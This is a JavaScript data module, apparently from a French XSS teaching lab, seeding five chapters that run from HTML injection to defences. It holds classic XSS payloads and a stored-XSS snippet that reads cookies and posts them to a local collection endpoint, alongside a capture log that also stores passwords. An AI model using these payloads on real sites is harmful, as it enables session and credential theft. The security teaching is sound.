const fs = require('fs');
const path = require('path');

const DATA_FILE = path.join(__dirname, '..', 'data.json');
const TEMP_FILE = path.join(__dirname, '..', 'data.json.tmp');

// Lecture du fichier JSON
function readData() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      // Créer un fichier vide si inexistant
      const initialData = {
        chapters: [],
        posts: {},
        comments: {},
        globalAdminComments: [],
        captures: []
      };
      writeData(initialData);
      return initialData;
    }
    const rawData = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(rawData);
  } catch (error) {
    console.error('Erreur lecture data.json:', error);
    return {
      chapters: [],
      posts: {},
      comments: {},
      globalAdminComments: [],
      captures: []
    };
  }
}

// Écriture atomique du fichier JSON
function writeData(data) {
  try {
    const jsonString = JSON.stringify(data, null, 2);
    // Écriture dans fichier temporaire
    fs.writeFileSync(TEMP_FILE, jsonString, 'utf-8');
    // Renommage atomique
    fs.renameSync(TEMP_FILE, DATA_FILE);
  } catch (error) {
    console.error('Erreur écriture data.json:', error);
    throw error;
  }
}

// Récupérer tous les chapitres
function getChapters() {
  const data = readData();
  return data.chapters || [];
}

// Récupérer un chapitre par ID
function getChapterById(id) {
  const chapters = getChapters();
  return chapters.find(ch => ch.id === id);
}

// Récupérer les posts d'un chapitre
function getPostsByChapter(chapterId) {
  const data = readData();
  return data.posts[chapterId] || [];
}

// Ajouter un post à un chapitre
function addPost(chapterId, post) {
  const data = readData();
  if (!data.posts[chapterId]) {
    data.posts[chapterId] = [];
  }
  data.posts[chapterId].push({
    id: Date.now().toString(),
    content: post.content,
    author: post.author,
    timestamp: new Date().toISOString(),
    safe: post.safe || false
  });
  writeData(data);
}

// Récupérer les commentaires d'un chapitre
function getCommentsByChapter(chapterId) {
  const data = readData();
  return data.comments[chapterId] || [];
}

// Ajouter un commentaire à un chapitre
function addComment(chapterId, comment) {
  const data = readData();
  if (!data.comments[chapterId]) {
    data.comments[chapterId] = [];
  }
  data.comments[chapterId].push({
    id: Date.now().toString(),
    content: comment.content,
    author: comment.author,
    timestamp: new Date().toISOString()
  });
  writeData(data);
}

// Récupérer les commentaires admin globaux
function getGlobalAdminComments() {
  const data = readData();
  return data.globalAdminComments || [];
}

// Ajouter un commentaire admin global
function addGlobalAdminComment(comment) {
  const data = readData();
  if (!data.globalAdminComments) {
    data.globalAdminComments = [];
  }
  data.globalAdminComments.push({
    id: Date.now().toString(),
    content: comment.content,
    timestamp: new Date().toISOString()
  });
  writeData(data);
}

// Supprimer un commentaire admin global
function deleteGlobalAdminComment(commentId) {
  const data = readData();
  data.globalAdminComments = data.globalAdminComments.filter(c => c.id !== commentId);
  writeData(data);
}

// Récupérer les captures (demoToken)
function getCaptures() {
  const data = readData();
  return data.captures || [];
}

// Ajouter une capture
function addCapture(capture) {
  const data = readData();
  if (!data.captures) {
    data.captures = [];
  }
  data.captures.push({
    id: Date.now().toString(),
    demoToken: capture.demoToken,
    chapterId: capture.chapterId,
    userName: capture.userName,
    password: capture.password || null, // DÉMO: Capture du mot de passe
    userAgent: capture.userAgent,
    captureType: capture.captureType || 'cookie', // 'cookie' ou 'form'
    timestamp: new Date().toISOString()
  });
  writeData(data);
}

// Vider les captures
function clearCaptures() {
  const data = readData();
  data.captures = [];
  writeData(data);
}

// Initialiser les chapitres (si vide)
function initializeChapters() {
  const data = readData();
  if (data.chapters.length === 0) {
    data.chapters = [
      {
        id: 'chapter1',
        title: 'Chapitre 1 : Introduction - Injection HTML basique',
        order: 1,
        content: `
<h3>Objectif</h3>
<p>Comprendre comment l'injection HTML fonctionne et ses limites.</p>

<h3>Concept</h3>
<p>L'injection HTML permet d'insérer du code HTML dans une page web. Ce n'est pas encore du JavaScript, mais c'est la première étape.</p>

<h3>Exemples à tester</h3>
<ul>
  <li><code>&lt;strong&gt;Texte en gras&lt;/strong&gt;</code></li>
  <li><code>&lt;i&gt;Texte en italique&lt;/i&gt;</code></li>
  <li><code>&lt;h1&gt;Grand titre&lt;/h1&gt;</code></li>
  <li><code>&lt;img src="https://via.placeholder.com/150" /&gt;</code></li>
</ul>

<h3>Exercice</h3>
<p>Essayez d'injecter du HTML dans le champ ci-dessous et observez le résultat.</p>
        `,
        instructions: 'Postez un message avec du HTML et observez comment il est rendu.'
      },
      {
        id: 'chapter2',
        title: 'Chapitre 2 : XSS simple avec alert()',
        order: 2,
        content: `
<h3>Objectif</h3>
<p>Exécuter du JavaScript dans le navigateur via une faille XSS.</p>

<h3>Concept</h3>
<p>Le Cross-Site Scripting (XSS) permet d'exécuter du code JavaScript arbitraire dans le navigateur de la victime.</p>

<h3>Payloads classiques</h3>
<ul>
  <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
  <li><code>&lt;img src=x onerror="alert('XSS')" /&gt;</code></li>
  <li><code>&lt;svg onload="alert('XSS')"&gt;&lt;/svg&gt;</code></li>
  <li><code>&lt;body onload="alert('XSS')"&gt;</code></li>
</ul>

<h3>Exercice</h3>
<p>Essayez de déclencher une alerte JavaScript dans votre navigateur.</p>
        `,
        instructions: 'Utilisez un des payloads ci-dessus pour déclencher une alerte.'
      },
      {
        id: 'chapter3',
        title: 'Chapitre 3 : XSS stocké (Stored XSS)',
        order: 3,
        content: `
<h3>Objectif</h3>
<p>Comprendre la différence entre XSS réfléchi et XSS stocké.</p>

<h3>Concept</h3>
<p>Un XSS stocké (ou persistant) est sauvegardé dans la base de données et exécuté chaque fois qu'un utilisateur visite la page.</p>

<h3>Danger</h3>
<p>C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui visitent la page, pas seulement celui qui a cliqué sur un lien malveillant.</p>

<h3>Exercice</h3>
<p>Postez un message avec du JavaScript. Rechargez la page. Le script s'exécute-t-il à nouveau ?</p>
        `,
        instructions: 'Postez un payload XSS et observez s\'il persiste après rechargement.'
      },
      {
        id: 'chapter4',
        title: 'Chapitre 4 : Exfiltration de données (simulation)',
        order: 4,
        content: `
<h3>Objectif</h3>
<p>Comprendre comment un attaquant pourrait voler des données via XSS.</p>

<h3>Concept</h3>
<p>Un attaquant peut utiliser XSS pour exfiltrer des informations comme les cookies de session, les tokens, ou d'autres données sensibles.</p>

<h3>Démonstration (SIMULATION UNIQUEMENT)</h3>
<p>Dans cette app, nous simulons l'exfiltration avec un <strong>demoToken</strong> non sensible.</p>

<h3>Payload de démonstration</h3>
<pre><code>&lt;img src=x onerror="fetch('/api/collect', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    demoToken: document.cookie.match(/demoToken=([^;]+)/)?.[1] || 'NO_TOKEN',
    chapterId: 'chapter4',
    userName: document.cookie.match(/userName=([^;]+)/)?.[1] || 'Unknown'
  })
})" /&gt;</code></pre>

<p><strong>⚠️ AVERTISSEMENT :</strong> En situation réelle, ceci permettrait de voler des cookies de session. Ne JAMAIS utiliser ces techniques sur de vraies applications sans autorisation !</p>

<h3>Exercice</h3>
<p>Essayez le payload ci-dessus et vérifiez dans le panneau admin si le demoToken a été capturé.</p>
        `,
        instructions: 'Testez l\'exfiltration du demoToken et vérifiez les captures dans l\'admin.'
      },
      {
        id: 'chapter5',
        title: 'Chapitre 5 : Défenses contre XSS',
        order: 5,
        content: `
<h3>Objectif</h3>
<p>Apprendre les techniques de protection contre les attaques XSS.</p>

<h3>1. Échappement (Escaping)</h3>
<p>Convertir les caractères spéciaux HTML en entités :</p>
<ul>
  <li><code>&lt;</code> devient <code>&amp;lt;</code></li>
  <li><code>&gt;</code> devient <code>&amp;gt;</code></li>
  <li><code>&amp;</code> devient <code>&amp;amp;</code></li>
</ul>

<h3>2. Sanitization</h3>
<p>Utiliser des bibliothèques comme DOMPurify (client) ou sanitize-html (serveur) pour nettoyer le HTML.</p>

<h3>3. Content Security Policy (CSP)</h3>
<p>Définir une politique de sécurité qui limite les sources de scripts autorisés.</p>

<h3>4. Cookies HttpOnly</h3>
<p>Marquer les cookies sensibles comme HttpOnly pour empêcher l'accès via JavaScript.</p>

<h3>Mode SAFE</h3>
<p>Dans cette app, vous pouvez basculer en mode SAFE pour voir le contenu échappé au lieu d'être exécuté.</p>
        `,
        instructions: 'Comparez le rendu en mode SAFE vs UNSAFE.'
      }
    ];
    writeData(data);
  }
}

module.exports = {
  readData,
  writeData,
  getChapters,
  getChapterById,
  getPostsByChapter,
  addPost,
  getCommentsByChapter,
  addComment,
  getGlobalAdminComments,
  addGlobalAdminComment,
  deleteGlobalAdminComment,
  getCaptures,
  addCapture,
  clearCaptures,
  initializeChapters
};
